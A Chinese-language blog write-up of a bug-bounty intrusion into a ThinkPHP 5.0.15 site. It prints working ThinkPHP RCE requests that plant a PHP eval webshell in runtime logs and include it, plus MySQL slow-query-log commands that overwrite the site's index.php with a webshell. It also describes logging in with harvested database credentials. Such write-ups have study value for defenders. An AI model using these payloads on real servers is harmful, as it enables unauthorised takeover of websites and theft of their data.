### 记一次TP框架的SRC

昨天的用的Druid泄露的session进后台拿shell还是觉得不太过瘾，也没学到啥新的知识。于是乎今天又找了几个新的站点来试试，哈哈哈哈哈哈。

这次操作纯属菜鸡练手，哪些地方可以改进还希望大佬们指出一下

目标站点：tp5.0.15+php7

#### 1 · 站点后台并发现是tp框架

首先找到的是站点后台，但是有验证码。

![image.png](https://image.3001.net/images/20220126/1643197336_61f13398507e007916edb.png!small)

扫目录的时候没有 404.html，说明站点没有设置统一的报错页面，那么应该就可以人为制造报错来查看框架。

果然是熟悉的tp框架，直接祭上神器碰碰运气，看能不能碰到tp版本的漏洞

![image.png](https://image.3001.net/images/20220126/1643197351_61f133a77c4233e5fad1b.png!small)

工具显示存在多个漏洞，其中有部分属于误报。

![image.png](https://image.3001.net/images/20220126/1643197520_61f134504c4141544b34d.png!small)

#### 2 · 尝试获得shell

尝试使用工具自带的写马功能，但是实际操作之后发现无法连接。下载文件查看后发现“>” 和“<” 变成了html中的实体字符。

学过一些java，本来准备查看工具的源码，看看是自带的马的问题还是传输到服务器之后被转义了。但是github上的源码文件是空的。

    
    
    工具自带的木马：
         &amplt?php @eval($_POST['showshell'])?&ampgt
    

尝试使用工具爆出的数据库账号密码加上 --os-shell 写入shell

    
    
    sqlmap -d mysql://name:passwd@ip:port/dbs_name
    

最后以失败告终。。。。。

![image.png](https://image.3001.net/images/20220126/1643197543_61f134679acd60b928ce3.png!small)

常规使用--os-shell的前提有三个：

    
    
    （1）网站必须是root权限
    
    （2）攻击者需要知道网站的绝对路径
    
    （3）GPC为off，php主动转义的功能关闭
    

直接连接数据库查看能不能找到管理员的账号和密码

找到一个像是主机的账号、密码表。

![image.png](https://image.3001.net/images/20220126/1643197556_61f13474d610d3dfb6d73.png!small)

拿到了pe_admin表中的内容后，尝试通过ssh连接服务器。但是发现这台服务器并没有ssh端口，这就很疑惑了

    
    
    nmap -sV -n ip
    

感觉自己有点傻，为什么不直接去网站的数据库找网站的后台登陆账号密码呢。

![image.png](https://image.3001.net/images/20220126/1643197567_61f1347f35e2605a0b4b0.png!small)

最后成功进入后台管理系统，不过这后台功能有点少啊，根本找不到上传点。看来还得想别的办法。

![image.png](https://image.3001.net/images/20220126/1643197575_61f134872d7fc862c7fa3.png!small)

#### 3 · 从TP框架入手

看来只能转换一下思路，从tp框架入手了。

这里直接 phpinfo 看一下 disable_functions()禁用了哪些函数。phpinfo的成功执行也证明是有RCE漏洞的

![image.png](https://image.3001.net/images/20220126/1643197585_61f1349145efe9507f9fa.png!small)

在尝试了几种方法之后发现无果，而且由于 php版本为 7.3 导致无法使用 assert 来执行命令。

自己不会没关系，网上肯定有人会。这里开始去网上搜各个大佬的方法。最终经过各种尝试，把希望寄在了将马写在日志或者session里

写入shell文件到日志中

    
    
    /index.php?s=captcha
    _method=__construct&method=get&filter[]=call_user_func&server[]=-1&get[]=<?php eval($_POST['shell']); ?>
    

包含日志文件getshell

    
    
    /index.php?s=captcha
    _method=__construct&method=get&filter[]=think\__include_file&server[]=-1&get[]=../runtime/log/202201/25.log&shell=phpinfo();
    

经测试，成功写入shell，但是此时只有极小的权限，并且由于 disable_function 的原因，虚拟终端无法使用。

还有一种方法是可以使用加载远程文件的方式去包含真正的shell。孩子要是有一台服务器就好了

![image.png](https://image.3001.net/images/20220126/1643197663_61f134dfefe71552ffcff.png!small)

![image.png](https://image.3001.net/images/20220126/1643197673_61f134e925603a6338811.png!small)

#### 4 · 通过MYSQL写入shell

突然想起来手里还有数据库的账号和密码，可以尝试使用mysql手动写shell。

    
    
    查看用户及权限
       SELECT user,host FROM mysql.user;
    

![image.png](https://image.3001.net/images/20220126/1643197682_61f134f2e25e2c968013c.png!small)

站点的绝对路径已经通过tp报错页和phpinfo拿到了

    
    
    select '<?php  @eval($_POST[showshell]);?>' into outfile 'D:\wwwroot\xxxxxxxx\public\index.php';
    

![image.png](https://image.3001.net/images/20220126/1643197698_61f135022b14a6ce717d8.png!small)

报错是因为mysql配置的 --secure-file-priv 默认值为 null，而只有当其值非空的时候才才能使用 into oufile 写入文件。

* * *

关于慢查询：

当用户操作的查询语句超过系统的默认时间时，系统就会将此条语句纪录到慢查询日志中。系统一般默认的时间是10秒

* * *

这里我们使用慢查询绕过 security-file-priv 写入shell：

    
    
    查询  slow query log 状态
    SHOW VARIABLES like '%slow_query_log%';
    

![image.png](https://image.3001.net/images/20220126/1643197715_61f13513a4c22487b3c12.png!small)

可以看到处于默认的关闭状态。

    
    
    启用慢查询：
    set global slow_query_log=1;
    

![image.png](https://image.3001.net/images/20220126/1643197735_61f135273b9b75afb63ec.png!small)

指定慢查询的日志文件路径及文件名，

    
    
    SET GLOBAL slow_query_log_file='
    D:\wwwroot\xxxxx\public\index.php ';
    

写入shell

    
    
    select '<?php eval($_GET[showshell])?>' or SLEEP(11);
    

![image.png](https://image.3001.net/images/20220126/1643197745_61f135319eb55c7380913.png!small)

成功写入。

这里遇到一个小问题，windows上的蚁剑和哥斯拉不知道为什么连不上去。可能是我这边的环境变量有问题，最后使用kali里的蚁剑成功连接shell并获得root权限

![image.png](https://image.3001.net/images/20220126/1643197766_61f135465c6b68498af36.png!small)

